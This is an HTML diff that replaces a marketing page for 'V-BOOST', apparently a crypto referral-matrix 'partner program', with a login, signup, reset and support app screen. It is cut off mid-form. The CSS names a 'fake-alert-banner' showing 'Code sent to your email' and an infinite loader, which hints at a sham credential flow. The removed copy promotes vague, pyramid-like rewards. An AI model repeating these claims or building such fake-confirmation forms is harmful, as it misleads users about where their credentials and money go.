@@ -3,603 +3,619 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>V-BOOST Official Layout</title>
+    <title>V-BOOST</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    
     <style>
         * {
-            box-sizing: border-box;
             margin: 0;
             padding: 0;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            box-sizing: border-box;
+            font-family: 'Inter', sans-serif;
+            -webkit-tap-highlight-color: transparent;
         }
 
         body {
-            background-color: #000000;
-            color: #ffffff;
-            padding-bottom: 60px;
+            background-color: #f8f9fa;
+            color: #000000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
         }
 
-        /* Exact Navigation Layout from Recording */
-        header {
-            position: fixed;
-            top: 0;
-            left: 0;
+        /* Screen Wrapper (Mobile App Core Frame View) */
+        .app-container {
+            background: #ffffff;
             width: 100%;
+            max-width: 420px;
+            height: 100vh;
+            min-height: 650px;
+            position: relative;
+            padding: 24px;
+            display: flex;
+            flex-direction: column;
+            overflow-y: auto;
+            box-shadow: 0 0 20px rgba(0,0,0,0.05);
+        }
+
+        @media (min-width: 421px) {
+            .app-container {
+                height: 850px;
+                border-radius: 30px;
+                border: 1px solid #eef0f2;
+            }
+        }
+
+        /* Reusable Header Components */
+        .header-row {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            padding: 20px;
-            z-index: 1000;
-            background-color: rgba(0, 0, 0, 0.85);
-            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            margin-bottom: 24px;
+            width: 100%;
         }
 
-        .logo {
-            font-size: 20px;
-            font-weight: 800;
-            letter-spacing: -0.5px;
+        /* Exact V-BOOST Custom Logo Text Style */
+        .v-logo {
+            font-size: 32px;
+            font-weight: 900;
+            font-style: italic;
+            color: #111111;
+            letter-spacing: -1.5px;
+            text-transform: uppercase;
         }
 
-        .menu-trigger-btn {
-            width: 38px;
-            height: 38px;
-            background: rgba(255, 255, 255, 0.04);
-            border-radius: 50%;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            gap: 4px;
+        .support-btn-top {
+            background: #ffffff;
+            border: 1px solid #e5e7eb;
+            color: #111111;
+            padding: 10px 24px;
+            border-radius: 25px;
+            font-size: 15px;
+            font-weight: 500;
             cursor: pointer;
-            border: 1px solid rgba(255, 255, 255, 0.08);
         }
 
-        .menu-trigger-btn span {
-            width: 14px;
-            height: 2px;
-            background-color: #ffffff;
-        }
-
-        /* Hero Main Stage */
-        .hero-viewport-panel {
-            padding: 130px 20px 60px 20px;
-            text-align: left;
-            background: radial-gradient(circle at 50% 15%, #250508 0%, #000000 70%);
-        }
-
-        .main-headline {
-            font-size: 34px;
-            font-weight: 800;
-            line-height: 1.2;
-            margin-bottom: 16px;
-        }
-
-        .main-headline span {
-            color: #e51937;
-        }
-
-        .sub-paragraph-text {
-            font-size: 14.5px;
-            color: #8e8e93;
-            line-height: 1.5;
+        .back-btn-row {
+            display: flex;
+            align-items: center;
+            color: #000000;
+            font-size: 17px;
+            font-weight: 500;
+            cursor: pointer;
             margin-bottom: 30px;
-        }
-
-        .action-button-red {
-            display: inline-block;
-            background-color: #e51937;
-            color: #ffffff;
-            padding: 12px 28px;
-            border-radius: 22px;
-            font-size: 14.5px;
-            font-weight: 600;
-            text-decoration: none;
+            background: none;
             border: none;
-            cursor: pointer;
+            width: fit-content;
         }
 
-        /* Component Structural Sections */
-        .content-layout-block {
-            padding: 40px 20px;
+        .back-btn-row svg {
+            margin-right: 6px;
+            width: 18px;
+            height: 18px;
         }
 
-        .block-header-title {
-            font-size: 22px;
-            font-weight: 700;
-            margin-bottom: 18px;
+        /* Global UI Typography */
+        .main-title {
+            font-size: 26px;
+            font-weight: 600;
+            color: #000000;
+            margin-bottom: 10px;
+            text-align: center;
         }
 
-        .row-items-stack {
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-        }
-
-        .row-item-card {
-            background-color: #111112;
-            border: 1px solid rgba(255, 255, 255, 0.06);
-            border-radius: 12px;
-            padding: 16px;
-            display: flex;
-            align-items: center;
-            gap: 14px;
-        }
-
-        .item-icon-frame {
-            width: 38px;
-            height: 38px;
-            background: rgba(255, 255, 255, 0.03);
-            border-radius: 50%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            flex-shrink: 0;
-            border: 1px solid rgba(255, 255, 255, 0.05);
-        }
-
-        .item-icon-frame svg {
-            width: 16px;
-            height: 16px;
-            fill: #e51937;
-        }
-
-        .item-description-lbl {
-            font-size: 13.5px;
-            color: #ffffff;
+        .sub-description {
+            font-size: 15px;
+            color: #6b7280;
+            margin-bottom: 40px;
+            text-align: center;
             line-height: 1.4;
         }
 
-        /* Abstract Product Summary Block */
-        .summary-card-panel {
-            background-color: #09090a;
-            border-radius: 16px;
-            padding: 24px 16px;
-            border: 1px solid rgba(255, 255, 255, 0.06);
+        /* Form Layout Elements */
+        .input-group {
+            margin-bottom: 24px;
+            text-align: left;
+            position: relative;
         }
 
-        /* Sequence Operational Steps */
-        .sequence-step-box {
-            background-color: #111112;
-            border: 1px solid rgba(255, 255, 255, 0.06);
-            border-radius: 14px;
-            padding: 18px;
+        .input-group label {
+            display: block;
+            font-size: 15px;
+            color: #6b7280;
             margin-bottom: 10px;
         }
 
-        .sequence-top-meta {
+        .input-box {
+            width: 100%;
+            padding: 16px 20px;
+            border: 1px solid #e5e7eb;
+            border-radius: 25px;
+            font-size: 16px;
+            color: #000000;
+            outline: none;
+            background: #ffffff;
+        }
+
+        .input-box::placeholder {
+            color: #9ca3af;
+        }
+
+        /* Password Wrapper Eye Toggle (Pure Line Art, No Color) */
+        .pass-wrapper {
+            position: relative;
+        }
+
+        .eye-toggle {
+            position: absolute;
+            right: 20px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+        }
+
+        .eye-toggle svg {
+            width: 22px;
+            height: 22px;
+            fill: none;
+            stroke: #9ca3af;
+            stroke-width: 1.8;
+        }
+
+        /* Links & Utility Buttons */
+        .forgot-pass-container {
+            text-align: right;
+            margin-top: -12px;
+            margin-bottom: 40px;
+        }
+
+        .forgot-pass-link {
+            color: #ff4a4a;
+            font-size: 14px;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .action-submit-btn {
+            background-color: #ff4545;
+            color: #ffffff;
+            border: none;
+            width: 55%;
+            padding: 15px;
+            border-radius: 30px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin: 0 auto;
+            display: block;
+            text-align: center;
+        }
+
+        .footer-switch-text {
+            text-align: center;
+            font-size: 15px;
+            color: #000000;
+            margin-top: 25px;
+        }
+
+        .footer-switch-text a {
+            color: #ff4a4a;
+            text-decoration: none;
+            font-weight: 600;
+            margin-left: 5px;
+        }
+
+        /* Dropdown Styling */
+        .select-wrapper {
+            position: relative;
+        }
+
+        .select-wrapper::after {
+            content: '';
+            position: absolute;
+            right: 20px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 12px;
+            height: 8px;
+            background: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%239ca3af' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E") no-repeat center;
+            background-size: contain;
+            pointer-events: none;
+        }
+
+        .select-box {
+            width: 100%;
+            padding: 16px 20px;
+            border: 1px solid #e5e7eb;
+            border-radius: 25px;
+            font-size: 16px;
+            color: #000000;
+            outline: none;
+            appearance: none;
+            background: #ffffff;
+            cursor: pointer;
+        }
+
+        /* Large Textarea Formats */
+        .textarea-box {
+            width: 100%;
+            padding: 18px 20px;
+            border: 1px solid #e5e7eb;
+            border-radius: 18px;
+            font-size: 16px;
+            color: #000000;
+            outline: none;
+            resize: none;
+            background: #ffffff;
+        }
+
+        .char-instruction-text {
+            font-size: 13px;
+            color: #9ca3af;
+            line-height: 1.5;
+            margin-top: 8px;
+            margin-bottom: 24px;
+        }
+
+        /* Attach Files Box (Static Design Element) */
+        .attach-dashed-box {
+            border: 1px solid #e5e7eb;
+            border-radius: 20px;
+            padding: 30px 20px;
+            text-align: center;
+            color: #9ca3af;
+            font-size: 14px;
+            margin-bottom: 35px;
+        }
+
+        .attach-dashed-box svg {
+            width: 28px;
+            height: 28px;
+            stroke: #9ca3af;
+            fill: none;
+            stroke-width: 1.5;
+            margin-bottom: 10px;
+        }
+
+        .click-upload-span {
+            color: #ff4a4a;
+            font-weight: 500;
+        }
+
+        /* Checkbox & Dynamic Red Check Styling */
+        .checkbox-container {
+            display: flex;
+            align-items: flex-start;
+            margin-bottom: 30px;
+            text-align: left;
+            cursor: pointer;
+        }
+
+        .checkbox-container input {
+            display: none;
+        }
+
+        .custom-check-box {
+            width: 20px;
+            height: 20px;
+            border: 1px solid #e5e7eb;
+            border-radius: 4px;
+            margin-right: 12px;
+            flex-shrink: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: #ffffff;
+        }
+
+        .checkbox-container input:checked + .custom-check-box {
+            border-color: #ff4545;
+            background-color: #ffffff;
+        }
+
+        .checkbox-container input:checked + .custom-check-box::after {
+            content: '✓';
+            color: #ff4545;
+            font-size: 14px;
+            font-weight: bold;
+        }
+
+        .checkbox-label-text {
+            font-size: 14px;
+            color: #000000;
+            line-height: 1.4;
+        }
+
+        .red-txt {
+            color: #ff4a4a;
+            text-decoration: none;
+        }
+
+        /* Bottom Row Controls */
+        .bottom-action-row {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: 4px;
+            margin-top: auto;
+            width: 100%;
         }
 
-        .sequence-title {
-            font-size: 17px;
-            font-weight: 600;
-        }
-
-        .sequence-id {
-            font-size: 32px;
-            font-weight: 700;
-            color: rgba(255, 255, 255, 0.03);
-        }
-
-        /* Grid Configuration Cards */
-        .modular-parameter-box {
-            background-color: #111112;
-            border: 1px solid rgba(255, 255, 255, 0.06);
-            border-radius: 16px;
-            padding: 24px 16px;
-            margin-bottom: 12px;
-            position: relative;
-        }
-
-        .badge-pill-coming {
-            position: absolute;
-            top: 24px;
-            right: 16px;
-            background-color: rgba(255, 255, 255, 0.05);
-            color: #ffffff;
-            padding: 4px 8px;
-            border-radius: 8px;
-            font-size: 10.5px;
-            font-weight: 600;
-            border: 1px solid rgba(255, 255, 255, 0.06);
-        }
-
-        .modular-parameter-box h4 {
-            font-size: 18px;
-            font-weight: 600;
-            margin-bottom: 8px;
-        }
-
-        .structure-list-node {
-            list-style: none;
-            margin-top: 10px;
-        }
-
-        .structure-list-node li {
-            position: relative;
-            padding-left: 14px;
-            margin-bottom: 6px;
-            font-size: 13px;
-            color: #a1a1a6;
-            line-height: 1.4;
-        }
-
-        .structure-list-node li::before {
-            content: "•";
-            position: absolute;
-            left: 0;
-            color: #e51937;
-        }
-
-        /* Persistent Action Hub Button */
-        .launcher-action-btn {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            background-color: #1a1a1c;
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            color: #ffffff;
-            padding: 10px 16px;
-            border-radius: 20px;
-            font-size: 13px;
+        .cancel-btn-light {
+            background: #f3f4f6;
+            color: #4b5563;
+            border: none;
+            padding: 14px 35px;
+            border-radius: 25px;
+            font-size: 16px;
             font-weight: 500;
             cursor: pointer;
-            z-index: 900;
         }
 
-        /* Universal Section Footer Node */
-        footer {
-            background-color: #000000;
-            border-top: 1px solid rgba(255, 255, 255, 0.06);
-            padding: 40px 20px 20px 20px;
-            text-align: center;
-        }
-
-        .footer-brand-title {
-            font-size: 22px;
-            font-weight: 800;
-            margin-bottom: 16px;
-        }
-
-        .footer-nav-row {
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: center;
-            gap: 14px;
-            margin-bottom: 24px;
-        }
-
-        .footer-nav-row a {
-            color: #8e8e93;
-            text-decoration: none;
-            font-size: 13px;
-        }
-
-        .footer-copyright {
-            font-size: 11.5px;
-            color: rgba(255, 255, 255, 0.15);
-        }
-
-        /* ========================================================================= */
-        /* =========================== POPUP MODAL STYLES ========================== */
-        /* ========================================================================= */
-        .window-dimmer-layer {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.85);
-            backdrop-filter: blur(10px);
-            -webkit-backdrop-filter: blur(10px);
-            z-index: 2000;
-            display: none;
-            justify-content: center;
-            align-items: center;
-            padding: 16px;
-            overflow-y: auto;
-        }
-
-        .window-dimmer-layer.active-state {
-            display: flex;
-        }
-
-        .modal-frame-container {
-            background-color: #0a0a0c;
-            border: 1px solid rgba(255, 255, 255, 0.06);
-            width: 100%;
-            max-width: 390px;
-            border-radius: 16px;
-            padding: 24px 16px;
-            position: relative;
-        }
-
-        .modal-close-trigger {
-            position: absolute;
-            top: 18px;
-            right: 16px;
-            width: 28px;
-            height: 28px;
-            background: rgba(255, 255, 255, 0.04);
-            border-radius: 50%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            cursor: pointer;
-            font-size: 12px;
-        }
-
-        .modal-title-text {
-            font-size: 20px;
-            font-weight: 700;
-            text-align: center;
-            margin-bottom: 4px;
-        }
-
-        .modal-subtitle-text {
-            font-size: 12.5px;
-            color: #8e8e93;
-            text-align: center;
-            margin-bottom: 22px;
-        }
-
-        /* Form Controls */
-        .form-control-row {
-            margin-bottom: 14px;
-            position: relative;
-        }
-
-        .form-control-row label {
-            display: block;
-            font-size: 12px;
-            margin-bottom: 5px;
-            color: #a1a1a6;
-        }
-
-        .input-text-node {
-            width: 100%;
-            background-color: rgba(255, 255, 255, 0.02);
-            border: 1px solid rgba(255, 255, 255, 0.06);
-            padding: 11px 12px;
-            border-radius: 8px;
+        .send-btn-red {
+            background: #ff4545;
             color: #ffffff;
-            font-size: 13.5px;
-        }
-
-        .input-text-node:focus {
-            outline: none;
-            border-color: #e51937;
-        }
-
-        .password-mask-toggle {
-            position: absolute;
-            right: 12px;
-            top: 30px;
+            border: none;
+            padding: 14px 45px;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: 500;
             cursor: pointer;
-            color: #8e8e93;
-            font-size: 13px;
         }
 
-        .forgot-pass-anchor {
+        /* Sign Up Page Conditional Continue Button Colors */
+        .signup-continue-btn {
+            background-color: #ffcaa6; /* Light Red/Pink Initial */
+            color: #ffffff;
+            border: none;
+            width: 55%;
+            padding: 15px;
+            border-radius: 30px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin: 0 auto;
             display: block;
-            text-align: right;
-            font-size: 12px;
-            color: #e51937;
-            text-decoration: none;
-            margin-top: -4px;
-            margin-bottom: 18px;
+            transition: background-color 0.3s ease;
         }
 
-        .modal-switch-footer {
-            text-align: center;
-            font-size: 12.5px;
-            color: #8e8e93;
-            margin-top: 16px;
+        .signup-continue-btn.active-dark-red {
+            background-color: #d62828 !important; /* Dark Red when valid */
         }
 
-        .modal-switch-footer span {
-            color: #e51937;
-            cursor: pointer;
-        }
-
-        /* Form Metadata Options */
-        .criteria-stack {
-            list-style: none;
-            margin: 10px 0;
-        }
-
-        .criteria-item {
-            font-size: 11.5px;
-            color: #8e8e93;
-            margin-bottom: 4px;
-        }
-
-        .checkbox-row-wrapper {
+        /* Infinite Loader Elements */
+        .loader-screen-content {
             display: flex;
-            align-items: flex-start;
-            gap: 7px;
-            margin-bottom: 18px;
-            font-size: 11.5px;
-            color: #8e8e93;
-            line-height: 1.4;
-        }
-
-        /* Sliding Top Drop Drawer Menu Panel */
-        .sliding-drawer-panel {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: #000000;
-            z-index: 1500;
-            display: none;
             flex-direction: column;
             justify-content: center;
             align-items: center;
-            padding: 20px;
-        }
-
-        .sliding-drawer-panel.active {
-            display: flex;
-        }
-
-        .drawer-links-list {
-            list-style: none;
+            flex-grow: 1;
             text-align: center;
+            padding-bottom: 60px;
+        }
+
+        .spinner-circle {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #ff4545;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
             margin-bottom: 24px;
         }
 
-        .drawer-links-list li {
-            margin-bottom: 16px;
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
 
-        .drawer-links-list a {
-            font-size: 22px;
-            font-weight: 600;
-            color: #8e8e93;
-            text-decoration: none;
+        .loading-msg-text {
+            font-size: 16px;
+            color: #000000;
+            font-weight: 500;
         }
 
-        /* Upload File Handling Framework Area Box */
-        .upload-drag-zone-box {
-            border: 2px dashed rgba(255, 255, 255, 0.06);
-            border-radius: 10px;
-            padding: 18px;
-            text-align: center;
+        /* View Section Management Layer */
+        .app-view {
+            display: none;
+            flex-direction: column;
+            height: 100%;
+            width: 100%;
+        }
+
+        .app-view.active-view {
+            display: flex;
+        }
+
+        /* Top Bar Cross Close Button Layout */
+        .header-close-row {
+            display: flex;
+            justify-content: flex-end;
+            width: 100%;
+            margin-bottom: 20px;
+        }
+
+        .cross-close-btn {
+            background: #f3f4f6;
+            color: #000000;
+            border: none;
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            font-size: 20px;
+            line-height: 1;
             cursor: pointer;
-            color: #8e8e93;
-            font-size: 11.5px;
-            margin-bottom: 14px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .fake-alert-banner {
+            background-color: #def7ec;
+            color: #03543f;
+            padding: 12px;
+            border-radius: 12px;
+            font-size: 14px;
+            text-align: center;
+            margin-bottom: 20px;
+            font-weight: 500;
+            display: none;
         }
     </style>
 </head>
 <body>
 
-    <header>
-        <div class="logo">V-BOOST</div>
-        <div class="menu-trigger-btn" onclick="toggleSlidingDrawerPanel(true)">
-            <span></span>
-            <span></span>
+<div class="app-container">
+
+    <div id="view-login" class="app-view active-view">
+        <div class="header-row">
+            <div class="v-logo">V-BOOST</div>
+            <button class="support-btn-top trigger-support">Support</button>
         </div>
-    </header>
-
-    <button class="launcher-action-btn" onclick="openTargetModalElement('supportModalBlock')">Support</button>
-
-    <section class="hero-viewport-panel">
-        <div class="main-headline">A Next-Generation <span>Gamified</span> Partner Program</div>
-        <p class="sub-paragraph-text">Grow your structure, receive participation rewards, and manage your digital position seamlessly inside the decentralized node layer matrix system.</p>
-        <div>
-            <button class="action-button-red" onclick="openTargetModalElement('loginModalBlock')">Learn More</button>
-        </div>
-    </section>
-
-    <section class="content-layout-block">
-        <div class="block-header-title">Unlike traditional systems:</div>
-        <div class="row-items-stack">
-            
-            <div class="row-item-card">
-                <div class="item-icon-frame">
-                    <svg viewBox="0 0 24 24"><path d="M21 18v1c0 1.1-.9 2-2 2H5c-1.11 0-2-.9-2-2V5c0-1.1.89-2 2-2h14c1.1 0 2 .9 2 2v1h-9c-1.11 0-2 .9-2 2v8c0 1.1.89 2 2 2h9zm-9-2h10V8H12v8zm4-2.5c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5 0.67 1.5 1.5-.67 1.5-1.5 1.5z"/></svg>
-                </div>
-                <div class="item-description-lbl">Digital item: an NFT position in your web3 wallet secure node.</div>
-            </div>
-
-            <div class="row-item-card">
-                <div class="item-icon-frame">
-                    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17h-2v-2h2v2zm2.07-7.75l-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H7c0-2.76 2.24-5 5-5s5 2.24 5 5c0 1.04-.42 1.99-1.07 2.25z"/></svg>
-                </div>
-                <div class="item-description-lbl">Step-by-step growth: ultra progress metrics and level multipliers.</div>
-            </div>
-
-            <div class="row-item-card">
-                <div class="item-icon-frame">
-                    <svg viewBox="0 0 24 24"><path d="M19 8l-4 4h3c0 3.31-2.69 6-6 6-1.01 0-1.97-.25-2.8-.7l-1.46 1.46C8.97 19.54 10.43 20 12 20c4.42 0 8-3.58 8-8h3l-4-4zM6 12c0-3.31 2.69-6 6-6 1.01 0 1.97.25 2.8.7l1.46-1.46C15.03 4.46 13.57 4 12 4c-4.42 0-8 3.58-8 8H1l4 4 4-4H6z"/></svg>
-                </div>
-                <div class="item-description-lbl">Auto-upgrade structure and auto-reactivation system matrices.</div>
-            </div>
-
-            <div class="row-item-card">
-                <div class="item-icon-frame">
-                    <svg viewBox="0 0 24 24"><path d="M7 18c-1.1 0-1.99.9-1.99 2S5.9 22 7 22s2-.9 2-2-.9-2-2-2zM1 2v2h2l3.6 7.59-1.35 2.45c-.16.28-.25.61-.25.96 0 1.1.9 2 2 2h12v-2H7.42c-.14 0-.25-.11-.25-.25l.03-.12.9-1.63h7.45c.75 0 1.41-.41 1.75-1.03l3.58-6.49c.08-.14.12-.31.12-.48 0-.55-.45-1-1-1H5.21l-.94-2H1zm16 16c-1.1 0-1.99.9-1.99 2s.89 2 1.99 2 2-.9 2-2-.9-2-2-2z"/></svg>
-                </div>
-                <div class="item-description-lbl">Trade program NFTs directly on the V-Place NFT Marketplace.</div>
-            </div>
-
-        </div>
-    </section>
-
-    <section class="content-layout-block" style="background-color: #040405;">
-        <div class="summary-card-panel">
-            <div class="block-header-title">About the Product</div>
-            <p class="sub-paragraph-text" style="color: #a1a1a6; margin-bottom: 20px;">V-Boost is a comprehensive next-generation gamified partner program environment where every digital tier position is managed safely via secure cryptography nodes.</p>
-            <button class="action-button-red" style="padding: 9px 22px; font-size: 13.5px;" onclick="openTargetModalElement('signUpModalBlock')">Explore</button>
-        </div>
-    </section>
-
-    <section class="content-layout-block">
-        <div class="block-header-title" style="margin-bottom: 20px;">Simple Path from Entry to your NFT Position</div>
         
-        <div class="sequence-step-box">
-            <div class="sequence-top-meta">
-                <div class="sequence-title">Position Creation</div>
-                <div class="sequence-id">01</div>
+        <h1 class="main-title" style="margin-top: 40px;">Welcome to V-Boost</h1>
+        <p class="sub-description">Where your growth becomes digital capital</p>
+
+        <form id="loginMainForm" onsubmit="handleLoginSubmit(event)">
+            <div class="input-group">
+                <label>Email</label>
+                <input type="email" id="loginEmail" class="input-box" placeholder="Enter email" required>
             </div>
-            <p class="sub-paragraph-text" style="margin: 0; font-size: 13.5px;">Establish your digital identity credentials across the core system decentralized registers.</p>
-        </div>
 
-        <div class="sequence-step-box">
-            <div class="sequence-top-meta">
-                <div class="sequence-title">Tier Activation</div>
-                <div class="sequence-id">02</div>
+            <div class="input-group">
+                <label>Password</label>
+                <div class="pass-wrapper">
+                    <input type="password" id="loginPassword" class="input-box" placeholder="Enter password" required>
+                    <div class="eye-toggle" onclick="togglePasswordVisibility('loginPassword')">
+                        <svg viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
+                    </div>
+                </div>
             </div>
-            <p class="sub-paragraph-text" style="margin: 0; font-size: 13.5px;">Activate tiers directly to initiate standard protocol participation pools.</p>
-        </div>
 
-        <div class="sequence-step-box">
-            <div class="sequence-top-meta">
-                <div class="sequence-title">Rewards Distribution</div>
-                <div class="sequence-id">03</div>
+            <div class="forgot-pass-container">
+                <a href="#" class="forgot-pass-link" id="linkForgotPassword">Forgot password?</a>
             </div>
-            <p class="sub-paragraph-text" style="margin: 0; font-size: 13.5px;">Automated processing rules distribute system participation weights periodically.</p>
+
+            <button type="submit" class="action-submit-btn">Log in</button>
+        </form>
+
+        <p class="footer-switch-text" style="margin-top: auto;">
+            Do not have an account?<a href="#" id="linkSignUp">Sign up</a>
+        </p>
+    </div>
+
+
+    <div id="view-support" class="app-view">
+        <div class="header-close-row">
+            <button class="cross-close-btn" onclick="handleSupportBackNavigation()">×</button>
         </div>
 
-        <div class="sequence-step-box">
-            <div class="sequence-top-meta">
-                <div class="sequence-title">Team Growth & Rewards</div>
-                <div class="sequence-id">04</div>
+        <h1 class="main-title">Need any help?</h1>
+        <p class="sub-description" style="margin-bottom: 25px;">What issues are you facing with the platform? Please describe it and send a request. We will send our response to your email.</p>
+
+        <form id="supportForm" onsubmit="handleSupportSubmit(event)" style="display: flex; flex-direction: column; flex-grow: 1;">
+            <div class="input-group">
+                <label>Email</label>
+                <input type="email" id="supportEmail" class="input-box" placeholder="johndoe@gmail.com" required>
             </div>
-            <p class="sub-paragraph-text" style="margin: 0; font-size: 13.5px;">Expand networking operations to scale structural performance levels recursively.</p>
+
+            <div class="input-group">
+                <label>Indicate the topic</label>
+                <div class="select-wrapper">
+                    <select id="supportTopic" class="select-box">
+                        <option value="Technical problem on the site">Technical problem on the site</option>
+                        <option value="I can't find a referral in the structure">I can't find a referral in the structure</option>
+                        <option value="Incorrect display of income">Incorrect display of income</option>
+                        <option value="Other">Other</option>
+                    </select>
+                </div>
+            </div>
+
+            <div class="input-group">
+                <label>Description</label>
+                <textarea id="supportDesc" class="textarea-box" rows="4" placeholder="Problem description" required></textarea>
+                <p class="char-instruction-text">Minimum 50, maximum 1000 characters. Describe the problem in as much detail as possible. If possible, please add screenshots to help us resolve your issue faster.</p>
+            </div>
+
+            <div class="input-group" style="margin-bottom: 20px;">
+                <label>Attach files</label>
+                <div class="attach-dashed-box">
+                    <svg viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4M17 8l-5-5-5 5M12 3v12" stroke-linecap="round" stroke-linejoin="round"/></svg>
+                    <p>Drag and drop or <span class="click-upload-span">Click to upload</span></p>
+                    <p style="font-size: 12px; margin-top: 5px;">JPG, PNG, PDF, LOG, TXT, MP4, MOV (total up to 30 MB)</p>
+                </div>
+            </div>
+
+            <div class="bottom-action-row">
+                <button type="button" class="cancel-btn-light" onclick="handleSupportBackNavigation()">Cancel</button>
+                <button type="submit" class="send-btn-red">Send</button>
+            </div>
+        </form>
+    </div>
+
+
+    <div id="view-forgot" class="app-view">
+        <div class="header-row">
+            <div class="v-logo">V-BOOST</div>
+            <button class="support-btn-top trigger-support">Support</button>
         </div>
-    </section>
 
-    <section class="content-layout-block" style="background-color: #040405;">
-        <div class="block-header-title">V-Boost Components</div>
-        <p class="sub-paragraph-text" style="margin-bottom: 20px;">Review the functional modular building blocks powering the core execution frameworks.</p>
+        <button class="back-btn-row" onclick="navigateTo('view-login')">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="15 18 9 12 15 6"></polyline></svg>Back
+        </button>
 
-        <div class="modular-parameter-box">
-            <h4>VGF Matrix Credits</h4>
-            <p class="sub-paragraph-text" style="margin: 0; font-size: 13.5px;">Internal accounting layer standard units used across all processing levels to measure access velocity thresholds inside tiers.</p>
+        <div id="forgotBanner" class="fake-alert-banner">Code sent to your email</div>
+
+        <h1 class="main-title" style="margin-top: 40px;">Reset your password</h1>
+        <p class="sub-description">Enter your registered email address</p>
+
+        <form id="forgotForm" onsubmit="handleForgotSubmit(event)">
+            <div class="input-group">
+                <label>Email</label>
+                <input type="email" id="forgotEmail" class="input-box" placeholder="Email" required>
+            </div>
+
+            <button type="submit" class="signup-continue-btn active-dark-red" style="width: 55%; margin-top: 30px; background-color: #ff4545;">Continue</button>
+        </form>
+    </div>
+
+
+    <div id="view-signup" class="app-view">
+        <div class="header-row">
+            <div class="v-logo">V-BOOST</div>
+            <button class="support-btn-top trigger-support">Support</button>
         </div>
 
-        <div class="modular-parameter-box">
-            <div class="badge-pill-coming">Coming Soon</div>
-            <h4>V-Boost Marketplace</h4>
-            <ul class="structure-list-node">
-                <li>Manage custom NFTs linked to ecosystem operational velocity tracks.</li>
-                <li>Transfer items seamlessly within regional environment zones.</li>
-                <li>Access distributed peer networks with advanced clarity.</li>
-            </ul>
-        </div>
+        <button class="back-btn-row" onclick="navigateTo('view-login')">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="15 18 9 12 15 6"></polyline></svg>Back
+        </button>
 
-        <div class="modular-parameter-box">
-            <h4>Control & Trust Infrastructure</h4>
-            <p class="sub-paragraph-text" style="margin: 0; font-size: 13.5px;">Your positions remain autonomously mapped under verified cryptography rules completely devoid of hidden variables.</p>
-        </div>
-    </section>
+        <h1 class="main-title">Create your V-Boost account</h1>
+        <p class="sub-description">Where your growth becomes digital capital</p>
 
-    <section class="content-layout-block" style="text-align: center; background: radial-gradient(circle at 50% 100%, #1a0305 0%, #000 60%);">
-        <div class="block-header-title" style="margin-bottom: 6px;">V-Boost is Your Participation</div>
-        <p class="sub-paragraph-text">Initialize your core terminal link connection s
+        <form id="signupMainForm" onsubmit="handleSignupSubmit(event)">
+            <div class="input-group">
+                <label>Email</label>
+                <input type="email" id="signupEmail" class="input-box" placeholder="Email" required oninput="validateSignupForm()">
+            </div>
+
+            <div class="input-group">
+                <label>Create password</label>
+                <div class="pass-wrapper">
+                    <input type="password" id="signupPassword" class="input-box" placeholder="Password" required oninput="validateSignupForm()">
+                    <div class="eye-toggle" onclick="togglePasswordVisibility('signupPassword')">
+                        <svg viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
+                    </div>
+                </div>
+            </div>
+
+            <div class="input-group">
+                <label>Confirm password</label>
